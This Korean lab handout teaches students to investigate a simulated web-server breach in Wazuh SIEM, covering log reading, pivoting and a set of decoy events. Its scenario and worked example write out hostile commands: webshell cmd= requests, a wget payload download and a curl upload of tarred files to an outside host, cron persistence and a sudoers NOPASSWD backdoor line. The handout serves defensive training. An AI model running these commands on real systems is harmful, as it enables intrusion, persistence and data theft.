침해 웹서버 로그 분석 실습 교안

여러 종류의 보안 로그를 Wazuh SIEM으로 분석해, 정상 트래픽 속에 숨은 침해 흔적을 시간·IP·계정으로 연결하고, 실제 침해와 미끼(정찰·정상업무·방어성공)를 구분하는 CTF형 실습입니다. 배경지식이 없어도 따라올 수 있도록 구성도·시나리오·로그 읽는 법·분석 방법·실전 쿼리까지 담았습니다.

① 구성도② 시나리오③ 로그 소스 ④ 로그 라인 해부⑤ 분석 방법론⑥ Wazuh 실전 ⑦ 실전 예제⑧ MITRE ATT&CK⑨ 탐지 룰 ⑩ 주의점·오탐⑪ 용어집

1네트워크 · 시스템 구성도

이 실습 서버 한 대에 웹서버·로그·SIEM·문제풀이 포털이 모두 올라가 있습니다.

공격자는 인터넷에서 방화벽을 거쳐 웹서버(Apache)에 접근하고, 웹서버의 모든 활동은 7종 로그로 남아 로컬 Wazuh 에이전트가 수집합니다. 학생은 포털에서 문제를 받아 Wazuh 대시보드로 분석합니다.

2침해 시나리오

하나의 로그 뭉치에 여러 사건이 섞여 있습니다. 일부는 이어지는 공격 체인, 일부는 판단력을 시험하는 미끼입니다.

사건 개요

어느 날 새벽, 외부 인터넷의 198.51.100.23 주소에서 사내 웹서버(Apache)로 SSH 무차별 대입이 시작됩니다. 공격자는 root·admin·oracle·postgres 등 흔한 계정을 차례로 시도하다 실패하지만, 결국 웹 운영 계정 webadmin의 비밀번호를 알아내 로그인에 성공합니다. 침투에 성공한 공격자는 곧바로 웹셸(search.php)을 웹 루트에 심고, 그 웹셸을 통해 서버에 명령을 내려 정찰(id·whoami·uname) → 악성 페이로드 다운로드(wget) → 지속성 확보(cron 등록) → 시스템 바이너리 위장(/usr/bin/backup)까지 단계적으로 장악을 넓힙니다. 이어 야간에 /etc/sudoers.d에 NOPASSWD 백도어를 심어 언제든 root 권한을 쓸 수 있게 만들고, 마지막으로 내부 파일을 tar로 압축해 외부 서버 198.51.100.47로 유출(exfiltration)합니다. 최초 침투부터 유출까지 약 40분, 전 과정이 동일한 출발지 IP·계정으로 이어진 하나의 침해 사건입니다.

문제는, 같은 시간대의 로그에 이 침해와 무관한 사건 3건이 섞여 있다는 점입니다. 취약점 스캐너의 정찰(C), 정상 관리자의 야간 배포 작업(D), 실패만 반복되다 잠긴 로그인 시도(F)는 이상해 보이지만 실제 대응이 필요 없는 미끼입니다. 분석가의 임무는 이 뭉치에서 진짜 침해(A·B·E)를 골라내고 미끼를 걸러내는 것입니다.

#스토리라인성격핵심 로그
ASSH 브루트포스 → 웹셸(search.php) → 페이로드 다운로드 → cron 지속성 → /usr/bin/backup 변조체인auth · access · audit · cron
B야간 sudoers.d 백도어 등록 (NOPASSWD 권한 상승) — A와 동일 공격자체인auth · audit
E파일 압축(tar) 후 외부 유출(curl → 198.51.100.47) — 체인의 마지막체인access · audit
C스캐너 정찰 (sqlmap UA, 다수 404, 방화벽 포트스캔 차단) — 실제 침해 아님미끼access · error · ufw
D정상 관리자(opsadmin)의 야간 배포 cron — 공격처럼 보이나 정상미끼auth · cron
F반복 로그인 실패 후 계정 잠금 — 방어가 작동, 대응 불필요미끼auth

공격 체인 상세 (A → B → E · 동일 공격자 198.51.100.23 / webadmin)

  1. 최초 침투 — SSH 무차별 대입 (A1)
    공격자 198.51.100.23가 root·admin·test·oracle·ubuntu·postgres·git 등 흔한 계정으로 짧은 간격에 로그인을 반복 시도합니다. 존재하지 않는 계정은 Failed password for invalid user ..., 존재하는 계정은 Failed password for ...로 남다가, 마지막에 Accepted password for webadmin from 198.51.100.23 — 브루트포스가 성공한 순간이자 침해의 기점입니다. 근거: auth.log
  2. 웹셸 배치 (A2)
    공격자는 /tmp/search.php를 만든 뒤 sudo /bin/cp로 웹 루트 /var/www/html/search.php에 복사합니다. 평범한 검색 페이지처럼 보이지만, URL 파라미터로 받은 문자열을 서버 명령으로 실행하는 웹셸입니다. auth.log의 sudo 기록과 auditd의 파일 생성(key="webroot_write")에 흔적이 남습니다. 근거: auth.log · audit.log
  3. 원격 명령 실행 (A3)
    공격자는 GET /search.php?cmd=id, ?cmd=whoami, ?cmd=uname+-a, ?cmd=cat+/etc/passwd, ?cmd=ss+-tlnp 순으로 서버 권한·계정·네트워크를 정찰합니다. access.log에 cmd= 파라미터가 그대로 노출되고, auditd(key="webshell_exec")에 실제 프로세스 실행이 교차 기록됩니다. 근거: access.log · audit.log
  4. 페이로드 다운로드 (A4)
    웹셸로 wget http://198.51.100.47/kworker -O /tmp/.cache/kworker를 실행해, 정상 커널 스레드명(kworker)으로 위장한 악성 실행파일을 숨은 경로 /tmp/.cache/에 내려받습니다. 근거: access.log · audit.log
  5. 지속성 확보 — cron (A5)
    /etc/cron.d/apache-backup에 * * * * *(매분)와 @reboot로 /tmp/.cache/kworker를 실행하도록 등록합니다. 재접속·재부팅 후에도 악성코드가 자동 재실행되어 살아남습니다. 근거: cron.log · audit.log(key="cron_persist")
  6. 시스템 바이너리 위장 (A6)
    /usr/bin/backup이라는 시스템 명령처럼 보이는 파일을 setuid 권한으로 심어둡니다. strings로 열어보면 connect-back 주소(198.51.100.47:4444)·/root/.ssh/authorized_keys 등 흔적이 드러납니다. 근거: audit.log(key="bin_tamper")
  7. 권한 상승 — sudoers 백도어 (B)
    야간에 webadmin ALL=(ALL) NOPASSWD:ALL 한 줄을 /etc/sudoers.d/webadmin에 추가합니다. 이제 공격자는 비밀번호 없이 언제든 root 권한을 사용할 수 있습니다. 최초 침투와 동일한 출발지·계정 세션에서 발생합니다. 근거: auth.log · audit.log(key="priv_esc")
  8. 정보 유출 — exfiltration (E)
    tar czf /tmp/loot.tgz /var/www /etc/passwd로 민감 파일을 압축한 뒤, curl -T /tmp/loot.tgz http://198.51.100.47/up으로 외부 서버에 업로드합니다. 공격 체인의 종착점입니다. 근거: access.log · audit.log

미끼(오탐) 상세 — 이상해 보이지만 대응 불필요

  1. C · 웹 취약점 스캐너 (정찰)
    192.0.2.77에서 sqlmap User-Agent로 /admin.php·/.env·/wp-login.php·/phpmyadmin/ 등 없는 경로를 훑어 다수 404가 발생하고, 방화벽(UFW)이 여러 포트 스캔을 차단합니다. → 탐지는 되지만(rule 100102) 성공 응답·후속 행위가 없어 실제 침해로 이어지지 않은 정찰입니다. 저위험 모니터링 대상.
  2. D · 정상 관리자의 야간 배포 (정상 업무)
    사내 LAN 192.168.208.50의 관리자 opsadmin이 로그인 후 /etc/cron.d/deploy-nightly에 정기 배포 스크립트를 등록합니다. A의 cron 지속성과 모양은 비슷하지만, 계정·출발지·작업 목적이 정상 업무와 일치합니다. 공격자 IP와 무관 → 대응 불필요.
  3. F · 반복 로그인 실패 후 계정 잠금 (방어 성공)
    198.51.100.99에서 root 로그인을 6회 연속 실패하자 pam_faillock이 계정을 잠급니다. 성공한 인증이 하나도 없어 방어가 정상 작동한 사례입니다. 대응 불필요.
핵심 관점 — 알림·이상 로그의 '유무'가 아니라 '조사 후 대응이 필요한가'로 판단합니다. 진짜 침해(A·B·E)는 성공 응답 + 후속 행위 + 동일 공격자로 이어지는 체인이 특징이고, 미끼(C·D·F)는 정찰·정상업무·방어성공이라 흔적이 남아도 대응이 필요 없습니다.

웹 접근 로그 (Apache Combined)

└출발지 IP         └요청(경로+파라미터)        └상태  └크기      └User-Agent

빨강 출발지 IP, 파랑 요청 경로(여기에 cmd=가 있으면 웹셸), 초록 상태코드, 노랑 User-Agent(sqlmap·curl 등 도구 식별).

인증 로그 (sshd)

Aug 13 04:38:17 siem sshd[22050]: Accepted password for webadmin from 198.51.100.23 port 51060 ssh2
Aug 13 04:38:05 siem sshd[22004]: Failed password for invalid user oracle from 198.51.100.23 port 51002 ssh2
     └시각         └호스트  └데몬        └성공/실패          └계정         └출발지 IP

같은 IP에서 Failed 여러 번 → Accepted 패턴이 브루트포스 성공입니다. "invalid user"는 존재하지 않는 계정 시도.

감사 로그 (auditd)

type=SYSCALL ... comm="wget" exe="/usr/bin/wget" ... key="webshell_exec"
                실행된 명령          실행파일                     감사 규칙 태그

comm=은 실행된 명령, key=는 우리가 심은 감사 규칙 태그(webshell_exec/priv_esc/cron_persist/bin_tamper)로 의미를 바로 알 수 있습니다.

5분석 방법론 — 어떻게 접근하는가

  1. 기점 잡기 — 인증 로그에서 "다수 실패 후 성공"을 찾아 최초 침투 시각·IP·계정을 확정합니다.
    data.srcip:"198.51.100.23" and rule.groups:authentication_success
  2. 피벗(pivot) — 그 IP/계정을 필터해 같은 주체의 다른 행위를 모읍니다.
    data.srcip:"198.51.100.23"
  3. 시간축 연결 — 웹셸 배치 → 명령 실행 → 다운로드 → 지속성 → 변조 → 권한상승 → 유출을 시간순으로 잇습니다. 각 로그 줄에 찍힌 실제 시각(예: Aug 13 10:11:32, access.log의 [13/Aug/2026:10:16:32])을 읽어 배열하세요. ※ Discover의 Time 컬럼은 수집(적재) 시각이라 사건 순서와 다를 수 있으니, 순서 판단은 로그 본문의 시각으로 합니다.
  4. 교차 확인 — access.log의 요청과 audit.log의 프로세스 실행을 같은 시각으로 대조해 "정말 실행됐는지" 확인합니다.
  5. 미끼 걸러내기 — 이상 로그가 실제 침해로 이어졌는지(성공 응답·후속 행위) 따져 대응 우선순위를 정합니다.
핵심 관점 — SOC 분석은 "알림 개수"가 아니라 "조사 후 대응이 필요한가"로 판단합니다. 정찰(C)·정상업무(D)·방어성공(F)은 흔적이 남아도 대응이 불필요할 수 있습니다.

6Wazuh 실전 사용법

  1. 접속 — https://이_서버_IP → 계정 admin (비밀번호는 포털 상단에 표시).
  2. Discover 메뉴 → 좌측 상단에서 인덱스 패턴 선택:
    • wazuh-archives-* — 모든 로그(정상+이상). 기본 분석 대상.
    • wazuh-alerts-* — 룰에 걸린 탐지 알림만.
    • wazuh-alerts-*,wazuh-archives-* — 둘을 한 번에.
  3. 저장된 검색(상단 Open) — 전체 로그 / 웹 접근 / 인증 / 방화벽 / 탐지 알림을 열면 깔끔한 컬럼으로 바로 봅니다.
  4. 시간 범위 — 비어 보이면 우측 상단을 Last 1 year로 넓히세요(로그는 기준 시각 이전 24시간에 분포).

자주 쓰는 검색

data.srcip:"198.51.100.23"
full_log:"search.php"
rule.id:100101
full_log:"webshell_exec"
data.dstuser:"root"
location:"/var/log/ufw.log"
검색은 필드:값 형식입니다. 문자열은 full_log:"...", IP·계정은 data.srcip:"..."·data.dstuser:"...", 여러 조건은 and/or로 연결합니다.
대문자·특수문자(:)가 든 값은 따옴표 검색이 안 걸릴 수 있습니다. 이럴 땐 와일드카드를 쓰세요 — 예: full_log:*NOPASSWD*.

인덱스 패턴 — 어떤 로그를 볼지 고르는 '창'

인덱스 패턴은 Wazuh 인덱서(OpenSearch)에 쌓인 로그 묶음을 Discover에서 조회하도록 연결한 것입니다. 이 실습엔 3개가 준비돼 있습니다.

인덱스 패턴무엇을 보나
wazuh-archives-*모든 원문 로그(정상+이상) — 기본 분석 대상
wazuh-alerts-*룰에 걸린 탐지 알림만
wazuh-alerts-*,wazuh-archives-*둘을 한 번에 (난이도↑)

직접 만들려면 (목록에 없거나 새로 만들 때)

  1. 좌측 메뉴 → Dashboards Management(또는 Stack Management) → Index Patterns.
  2. Create index pattern 클릭 → 이름에 wazuh-archives-* 입력 (끝의 *로 날짜별 인덱스를 한 번에 묶음).
  3. 매칭되는 인덱스가 표시되면 Next step → Time field로 timestamp 선택 → Create index pattern.
  4. 이제 Discover 좌측 상단 드롭다운에서 그 패턴을 선택해 검색할 수 있습니다.
실습 환경엔 위 3개가 이미 생성돼 있어 Discover에서 선택만 하면 됩니다. 목록에 안 보일 때만 위 절차로 만드세요. (별표 *는 wazuh-archives-4.x-2026.08.13 같은 날짜별 인덱스를 한꺼번에 조회하기 위한 것)

공격자 IP를 모를 때 — 이상 탐지에서 출발

실제 조사는 공격자 IP를 모른 채 시작합니다. IP 없이도 걸 수 있는 신호로 출발해 IP·계정을 알아낸 뒤 그 값으로 피벗(pivot)합니다.

rule.level >= 10
rule.id:100101 or rule.id:100102
location:"/var/log/auth.log" and full_log:"Failed password"
full_log:"cmd=" or full_log:"search.php"

→ 결과의 data.srcip 컬럼에서 공격자 IP가 드러납니다. 한 IP가 여러 계정 시도 · 성공 응답 · 후속 행위를 보이면 유력합니다.

→ 알아낸 IP로 피벗: data.srcip:"찾은IP" → 그 공격자의 웹·인증·감사 로그가 한 번에 모입니다.

문제의 '권장 쿼리'에 IP가 이미 적혀 있는 것은 정답 확인용입니다. 실습에서는 위 신호에서 스스로 IP를 알아내는 연습을 하세요.

정규화 필드로 정밀 검색

Wazuh는 원시 로그를 디코더로 파싱해 의미 있는 필드로 정규화합니다. 원문 전체(full_log)를 텍스트로 뒤지는 것보다 정규화 필드로 검색하면 훨씬 정확하고 빠릅니다.

정규화 필드원문 대신 이렇게
data.srcipfull_log에서 IP를 눈으로 찾는 대신 data.srcip:"198.51.100.23"
data.srcuser · data.dstuserdata.dstuser:"root" — 대상 계정으로 정밀 필터
data.id (HTTP 상태코드)data.id:"404" — 스캐너의 다수 404 탐지
rule.id · rule.level · rule.groupsrule.groups:authentication_success — 룰이 분류한 '성격'으로 조회
decoder.name어떤 디코더가 파싱했는지(예: sshd·sudo)로 로그 종류 구분
정규화되지 않은 세부 내용(예: sudoers에 쓰인 NOPASSWD:ALL 문자열)은 data.* 필드에 없을 수 있습니다. 이럴 땐 원문(full_log) + 패턴 매칭으로 찾습니다.

패턴 매칭 (와일드카드 · 룰 정규식)

정확한 값을 모르거나 일부만 알 때는 와일드카드 * 로 패턴을 검색합니다.

full_log:*NOPASSWD*
data.srcip:198.51.100.*
full_log:*cmd=wget*
full_log:*.cache/kworker*
full_log:*sudoers.d*
full_log:*loot.tgz*

자주 찾는 것 → 이렇게 검색 (치트시트)

원문에서 특정 단어를 찾을 땐 full_log:*단어*. 정규화 필드가 있으면 그쪽이 더 정확합니다.

찾고 싶은 것검색어 (둘 중 하나)
SSH 관련 로그full_log:*ssh*  ·  location:"/var/log/auth.log"
로그인 실패full_log:*Failed*  ·  full_log:"Failed password"
로그인 성공full_log:*Accepted*  ·  rule.groups:authentication_success
특정 계정(webadmin)full_log:*webadmin*  ·  data.dstuser:"webadmin"
웹셸 명령 실행full_log:*cmd=*  ·  full_log:"search.php"
파일 다운로드(wget/curl)full_log:*wget*  ·  full_log:*curl*
특정 파일·경로full_log:*/tmp/.cache*  ·  full_log:*loot.tgz*
sudo 사용full_log:*sudo*

방화벽 차단full_log:*BLOCK*  ·  location:"/var/log/ufw.log"

DQL 검색창은 와일드카드(*)는 지원하지만 완전한 정규식(regex)은 지원하지 않습니다. 정규식 수준의 패턴 매칭은 Wazuh 룰·디코더가 탐지 단계에서 수행합니다 — 우리가 만든 룰이 cmd=·sqlmap·sudoers.d 같은 패턴을 정규식으로 잡아 rule.id 알림을 만듭니다. 그래서 '정규식으로 잡고 싶은 패턴'은 대개 이미 룰이 잡아두었으니 rule.id로 조회하는 게 가장 빠릅니다 (예: rule.id:100102 = sqlmap 스캐너 패턴, rule.id:100101 = 웹셸 cmd= 패턴).

7실전 예제 — 웹셸 침해를 처음부터 끝까지 추적

알림 한 건에서 출발해 전체 공격 체인을 복원하는, 분석가의 실제 사고 흐름입니다.

  1. 알림에서 출발 — 탐지 알림에서 웹셸 명령 실행(rule.id 100101)이 보입니다. 먼저 이 알림들을 엽니다.
    rule.id:100101
    access.log에 GET /search.php?cmd=id 같은 요청이 있고, 출발지 IP가 198.51.100.23 임을 확인합니다.
  2. 공격자로 피벗(pivot) — 그 IP가 남긴 모든 흔적을 한 번에 모읍니다.
    data.srcip:"198.51.100.23"
    인증(auth)·웹(access)·감사(audit) 로그가 함께 나옵니다. 한 IP가 여러 로그 소스에 걸쳐 있다는 것 자체가 평범한 사용자와 다른 신호입니다.
  3. 최초 침투 확인 — auth.log에서 다수 Failed password 뒤 Accepted password for webadmin 을 찾습니다. 브루트포스가 성공한 그 시각이 침투 기점입니다.
  4. 실제 실행 여부 교차검증 — 웹 요청이 정말 실행됐는지 감사 로그로 확인합니다.
    full_log:"webshell_exec"
    comm="id"·comm="wget" 등 실행 프로세스가 보이고, 요청(access)과 실행(audit)의 시각이 일치하면 실제 실행이 확정됩니다.
  5. 후속 행위 추적 — 다운로드 → 지속성 → 유출로 이어집니다.
    full_log:"/tmp/.cache/kworker"
    full_log:"loot.tgz"
    wget 다운로드 → cron 반복 실행(지속성) → tar 압축 → curl 외부 업로드(198.51.100.47) 순서로 연결됩니다.
  6. 결론·대응 — 침투→명령실행→다운로드→지속성→권한상승→유출까지 동일 공격자의 단일 체인으로 재구성됩니다. 대응: 계정 잠금 · 웹셸 제거 · cron/sudoers 백도어 제거 · 유출 범위 확인.
분석의 뼈대 — ‘알림 1건 → 출발지로 피벗 → 여러 로그를 시간축으로 연결 → 실행 여부 교차검증’. 이 네 단계는 어떤 침해 분석에도 그대로 적용됩니다.

10주의점 & 오탐 판별 체크리스트

  • 시간 필터 함정 — 로그는 기준 시각(포털 상단) 이전 24시간에 분포합니다. Discover가 비면 시간 범위를 Last 1 year로.
  • 알림 ≠ 침해 — 미끼(C·D·F)도 알림/이상 로그를 남깁니다. 조사 후 대응 필요성으로 판단하세요.
  • 정상 속 이상 — 로그 대부분은 정상 트래픽입니다. 검색으로 좁혀 이상을 골라내세요(정상 200/304 사이의 cmd=, 정상 로그인 사이의 다수 Failed).
  • 안전한 실습 — 모든 공격 아티팩트(웹셸·백도어·변조 바이너리)는 실행되지 않는 더미입니다.
  • 답안 형식 — 포털의 "답안 형식"에 맞춰 입력(시각 HH:MM:SS, IP xxx.xxx.xxx.xxx). 오답은 감점, 힌트는 누적 감점(−1·−2·−3).
